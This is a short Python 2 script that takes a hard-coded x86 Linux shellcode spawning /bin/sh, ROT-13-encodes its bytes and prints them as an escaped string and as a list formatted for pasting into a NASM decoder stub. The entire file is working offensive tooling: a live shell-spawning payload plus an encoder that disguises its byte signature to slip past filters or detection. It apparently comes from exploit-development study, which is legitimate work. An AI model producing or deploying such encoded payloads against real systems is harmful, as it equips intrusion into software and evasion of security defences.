#!/usr/bin/env python

shellcode = ("\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3"
             "\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80")

n = 13 # rot-n
max_value_without_wrapping = 256 - n

encoded_shellcode = ""
db_shellcode = []

for x in bytearray(shellcode):
    if x < max_value_without_wrapping:
        encoded_shellcode += '\\x%02x' % (x + n)
        db_shellcode.append('0x%02x' % (x + n))
    else:
        encoded_shellcode += '\\x%02x' % (n - 256 + x)
        db_shellcode.append('0x%02x' % (n - 256 + x))

print "Encoded shellcode:\n%s\n" % encoded_shellcode

print "DB formatted (paste in .nasm file):\n%s\n" % ','.join(db_shellcode)
